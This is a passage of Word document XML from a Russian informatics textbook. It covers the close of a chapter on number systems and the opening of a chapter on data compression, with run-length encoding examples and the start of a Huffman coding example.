      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   00:1A:2B:3C:4D:5E</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Литералы в программировании**: Шестнадцатеричные числа обозначаются префиксом 0x</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```c</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   int value = 0xFF;  // 255 в десятичной системе</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Дамп памяти (memory dump)**: При отладке программ и анализе файлов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   00000000: 48 65 6C 6C 6F 20 57 6F  72 6C 64 21 00 00 00 00  Hello World!....</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Unicode-символы**: Code points записываются в шестнадцатеричной форме</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   U+0041 = 'A'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   U+0416 = 'Ж'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Практические советы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Как быстро определить основание системы счисления</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>При записи чисел важно указывать систему счисления, так как одна и та же последовательность цифр может означать разные числа:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Индексная нотация**: 101₂, 101₈, 101₁₆, 101₁₀</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Префиксная нотация** (в программировании):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`0b101` или `0B101` — двоичное (binary)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`0o101` или `0O101` — восьмеричное (octal)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`101` — десятичное</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`0x101` или `0X101` — шестнадцатеричное (hexadecimal)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Проверка правильности перевода</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Обязательно проверяйте результаты</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Переводите результат обратно в исходную систему</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Используйте калькулятор для сверки (встроенный калькулятор Windows/Linux в режиме "Программист")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>При переводе больших чисел разбивайте задачу на части</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Распространённые ошибки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Неправильная нумерация разрядов**: Помните, что нумерация начинается с 0 справа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Порядок записи остатков**: При делении остатки записываются снизу вверх</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Забытые лидирующие нули**: В тетрадах и триадах важно дополнять нулями слева</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Путаница в буквах**: A₁₆ = 10₁₀, не путайте с единицей и нулём</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Система счисления</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — способ записи чисел с помощью определённого набора символов по установленным правилам.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Позиционная система счисления</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — система, в которой значение каждой цифры зависит от её позиции (разряда) в записи числа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Непозиционная система счисления</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — система, в которой значение цифры не зависит от её положения в записи числа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основание системы счисления (base, radix)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — количество различных цифр, используемых для представления чисел в позиционной системе.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Разряд (позиция)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — место, которое занимает цифра в записи числа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Развёрнутая форма числа</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — представление числа в виде суммы произведений цифр на соответствующие степени основания.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Триада</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — группа из трёх двоичных цифр, соответствующая одной восьмеричной цифре.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Тетрада</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — группа из четырёх двоичных цифр, соответствующая одной шестнадцатеричной цифре.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Метод последовательного деления</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — алгоритм перевода целых чисел из десятичной системы в систему с другим основанием.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Метод последовательного умножения</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — алгоритм перевода дробных чисел из десятичной системы в систему с другим основанием.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы для самопроверки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Переведите число 2024₁₀ в двоичную, восьмеричную и шестнадцатеричную системы счисления**. Проверьте каждый результат обратным переводом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Выполните прямой перевод 11111010₂ в восьмеричную и шестнадцатеричную системы** без использования десятичной системы. Объясните метод.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Почему в шестнадцатеричной системе используются буквы A-F?** Сколько цифр потребовалось бы, если бы мы не использовали буквы?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Переведите 0,75₁₀ в двоичную систему** методом последовательного умножения. Будет ли результат конечной дробью?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практическая задача**: В отладчике программы вы видите адрес памяти 0x2A3F. Сколько это байт от начала сегмента (в десятичной системе)? Запишите этот адрес в двоичной системе.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Связь с другими темами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Материал этой главы является основой для изучения следующих тем:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.1 (Арифметика в двоичной системе)**: Выполнение арифметических операций в различных системах счисления</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.9 (Представление числовых данных)**: Форматы хранения целых и вещественных чисел в памяти ЭВМ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Раздел 2 (Архитектура ЭВМ)**: Адресация памяти, машинные коды команд</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Раздел 6 (Языки программирования)**: Литералы различных систем счисления в коде, побитовые операции</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Раздел 8 (Сети)**: IP-адреса, маски подсетей, MAC-адреса</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Резюме</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В этой главе мы изучили системы счисления и методы перевода чисел между ними:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Понятие позиционной и непозиционной систем счисления, основание системы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Четыре основные системы: двоичная (основание 2), восьмеричная (8), десятичная (10), шестнадцатеричная (16)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Развёрнутая форма записи числа и её применение для перевода в десятичную систему</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Метод последовательного деления для перевода целых чисел из десятичной системы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Метод последовательного умножения для перевода дробных чисел из десятичной системы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Прямой перевод между двоичной, восьмеричной и шестнадцатеричной системами через триады и тетрады</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Практическое применение различных систем счисления в программировании и работе с компьютерами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Теперь вы умеете:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Переводить числа между любыми позиционными системами счисления</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использовать быстрые методы перевода между двоичной, восьмеричной и шестнадцатеричной системами</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Понимать, почему в информатике используются именно эти системы счисления</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Читать и интерпретировать шестнадцатеричные адреса памяти, цветовые коды, MAC-адреса</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Работать с различными представлениями чисел в программировании</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эти знания фундаментальны для понимания работы компьютера на низком уровне, отладки программ, работы с сетевыми протоколами и многих других задач в информатике.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>_Объем главы: ~14500 символов_</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 1.12: Способы сжатия информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Представь: ты качаешь фильм на 20 гигабайт. А теперь представь, что он весил бы 200 гигабайт без сжатия. Сжатие информации — это магия, которая экономит место на диске, трафик интернета и твои нервы. Но за всё приходится платить: либо временем на распаковку, либо качеством.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава связана с предыдущими темами:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.3** (звуковые данные) — форматы MP3, AAC, Opus используют сжатие с потерями</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.4** (символьные данные) — кодировки UTF-8 уже содержат элементы сжатия</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.8** (графические данные) — форматы JPEG, PNG, WebP используют различные алгоритмы сжатия</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Сжатие бывает двух типов: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>без потерь</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (lossless) и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>с потерями</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (lossy). Первое — как положить вещи в чемодан аккуратно, второе — как выкинуть половину вещей и сказать "и так сойдёт". Погнали разбираться.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Основные понятия</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Что такое сжатие данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сжатие данных (data compression)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это процесс уменьшения объёма информации путём устранения избыточности или менее значимых деталей.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Избыточность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это повторяющиеся или предсказуемые части данных, которые можно закодировать более компактно. Например, фраза "аааааааааа" занимает 10 байт, но можно записать как "10×а" и сэкономить место.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Степень и коэффициент сжатия</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Степень сжатия (compression ratio)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — отношение размера исходного файла к размеру сжатого файла:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Степень сжатия = Размер исходного / Размер сжатого</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Чем больше число — тем лучше сжатие.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Коэффициент сжатия</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — обратная величина, показывает во сколько раз уменьшился размер:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Коэффициент сжатия = Размер сжатого / Размер исходного × 100%</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Чем меньше процент — тем лучше.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1</w:t>
      </w:r>
      <w:r>
        <w:t>: Файл размером 100 МБ сжат до 25 МБ.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Степень сжатия = 100 МБ / 25 МБ = 4:1 (или просто "4")</w:t>
        <w:br/>
        <w:t>Коэффициент сжатия = 25 МБ / 100 МБ × 100% = 25%</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Говорим: "Файл сжат в 4 раза" или "Файл занимает 25% от оригинала".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Два типа сжатия</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сжатие без потерь (lossless compression)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — после распаковки получаешь </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>точно такие же данные</w:t>
      </w:r>
      <w:r>
        <w:t>, бит в бит. Используется для текста, программ, баз данных — там, где потеря даже одного бита критична.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сжатие с потерями (lossy compression)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — после распаковки данные </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>немного (или сильно) отличаются</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> от оригинала. Используется для мультимедиа (фото, звук, видео), где человек не заметит небольших потерь.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Алгоритмы сжатия без потерь</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>RLE (Run-Length Encoding) — для ленивых</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>RLE</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — простейший алгоритм: заменяет повторяющиеся символы на пару "количество + символ".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Исходная строка: `AAAABBCCCCCCD`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Сжатая: `4A2B6C1D`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Вместо 13 символов получили 8. Профит!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2</w:t>
      </w:r>
      <w:r>
        <w:t>: Сжать строку "WWWWWWWWWBBBWWW"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Исходная строка: WWWWWWWWWBBBWWW (15 символов)</w:t>
        <w:br/>
        <w:t>Сжатая строка:   9W3B3W          (6 символов + числа)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Если считать, что каждое число занимает 1 байт, а символ 1 байт:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Исходный размер: 15 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сжатый размер: 6 байт (3 пары "число+символ")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Степень сжатия: 15/6 = 2.5</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Где используется</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Факсы (чёрно-белые изображения с длинными полосами)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Простые графические форматы (BMP)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Форматы PCX, TIFF (с опцией RLE)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минус</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Если повторов мало, файл может даже </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>увеличиться</w:t>
      </w:r>
      <w:r>
        <w:t>. Например, строка "ABCDEFG" превратится в "1A1B1C1D1E1F1G" — в 2 раза длиннее. Облом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Кодирование Хаффмана — классика жанра</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгоритм Хаффмана (Huffman Coding)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — присваивает часто встречающимся символам короткие коды, а редким — длинные. Это как в азбуке Морзе: буква "E" в английском — это точка (.), а "Q" — тире-тире-точка-тире (--·-).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 3</w:t>
      </w:r>
      <w:r>
        <w:t>: Сжать строку "ABRACADABRA" (11 символов)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Частота символов:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A: 5 раз</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B: 2 раза</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>R: 2 раза</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C: 1 раз</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D: 1 раз</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Строим дерево Хаффмана и присваиваем коды:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A: `0` (самый частый)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B: `10`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>R: `110`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
